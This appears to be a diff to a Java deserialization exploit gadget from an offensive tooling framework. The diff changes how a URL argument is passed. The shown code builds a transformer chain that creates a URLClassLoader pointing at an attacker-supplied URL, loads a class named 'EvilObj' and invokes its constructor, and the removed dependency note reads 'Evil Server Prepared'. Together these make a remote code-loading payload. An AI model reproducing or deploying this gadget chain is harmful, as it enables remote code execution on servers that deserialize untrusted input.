@@ -10,11 +10,11 @@ import java.util.LinkedList;
  * @author wh1t3P1g
  * @since 2020/2/16
  */
-@Dependencies({"Internet Allowed and Evil Server Prepared"})
+@Dependencies({"--args url --args version"})
 @Authors({ Authors.WH1T3P1G })
 public class TransformerWithResponseBullet extends TransformerBullet {
 
-    public TransformerWithResponseBullet(String[] args, int version) {
+    public TransformerWithResponseBullet(String args, String version) {
         super(args, version);
     }
 
@@ -34,7 +34,7 @@ public class TransformerWithResponseBullet extends TransformerBullet {
         transformers.add(createInvokerTransformer("newInstance",
                 new Class[] { Object[].class },
                 new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
-                        args[0]) } } }));
+                        args) } } }));
         transformers.add(createInvokerTransformer("loadClass",
                 new Class[] { String.class }, new Object[] { "EvilObj" }));
         transformers.add(createInvokerTransformer("getConstructor",
